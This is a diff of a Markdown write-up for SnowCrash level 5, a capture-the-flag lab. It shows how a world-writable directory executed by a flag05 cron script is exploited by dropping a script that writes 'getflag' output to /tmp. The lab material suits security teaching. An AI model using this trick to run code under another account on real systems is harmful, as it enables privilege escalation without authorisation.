@@ -1,31 +1,24 @@
 # LEVEL05
 
 ## Analysis
-With the command ls -la we don't find much in our directory
-```bash
-        level05@SnowCrash:~$ ls -la
-        total 12
-        dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
-        d--x--x--x  1 root    users    340 Aug 30  2015 ..
-        -r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-        -r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-        -r-x------  1 level05 level05  675 Apr  3  2012 .profile
-```
 
-Therefore let's try to use the command find for the flag05
+Enumerating files in the home directory did not provide useful information but a search for files owned by `flag05` reveals:
 ```bash
-        level05@SnowCrash:~$ find / -user flag05 2>/dev/null
+        $ find / -user flag05 2>/dev/null
+```
+Output:
+```txt
         /usr/sbin/openarenaserver
         /rofs/usr/sbin/openarenaserver
 ```
 
-Great we found two files! Let's see the rights and what is inside if we can read them.
+## Investigation
+
+The first file is interesting since we can read and execute it:
 ```bash
-        level05@SnowCrash:~$ ls -la /usr/sbin/openarenaserver
+        $ ls -la /usr/sbin/openarenaserver
         -rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
-        level05@SnowCrash:~$ ls -la /rofs/usr/sbin/openarenaserver
-        -rwxr-x--- 1 flag05 flag05 94 Mar  5  2016 /rofs/usr/sbin/openarenaserver
-        level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+        $ cat /usr/sbin/openarenaserver
         #!/bin/sh
 
         for i in /opt/openarenaserver/* ; do
@@ -34,19 +27,28 @@ Great we found two files! Let's see the rights and what is inside if we can read
         done
 ```
 
-## Solution
+This script executes every file in `/opt/openarenaserver` directory using `bash -x "$i"` and then deletes it. Any file placed in this directory is executed automatically.
 
-Ok we have a script that runs every file in /opt/openarenaserver/* as flag05 (bash -x "$i") and then deletes it.
-That means if you (level05) can place a file in /opt/openarenaserver/, it will be executed as flag05 on the next
-cron run with flag05 privileges.
+## Vulnerability
+
+If a user can write into this directory, they can introduce arbitrary shell scripts that will be executed with flag05 privileges. This vulnerability consists on unsafe execution of user-controlled files in a privileged context.
+
+## Exploitation
+
+We place a malicious file in `/opt/openarenaserver/`.
 ```bash
-        level05@SnowCrash:~$ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
-        level05@SnowCrash:~$ cat /tmp/flag
+        $ echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
+        $ cat /tmp/flag
         cat: /tmp/flag: No such file or directory
-        level05@SnowCrash:~$ cat /tmp/flag
+        $ cat /tmp/flag
         cat: /tmp/flag: No such file or directory
-        level05@SnowCrash:~$ cat /tmp/flag
+        $ cat /tmp/flag
         cat: /tmp/flag: No such file or directory
-        level05@SnowCrash:~$ cat /tmp/flag
+        $ cat /tmp/flag
         Check flag.Here is your token : XXXXXXXXXXXXXXXXXXXXXXXXXX
 ```
+
+## Takeaways
+
+- Executing files from writable directories introduces severe security risks
+- bash -x executes scripts in a trace/debug mode but still runs commands fully
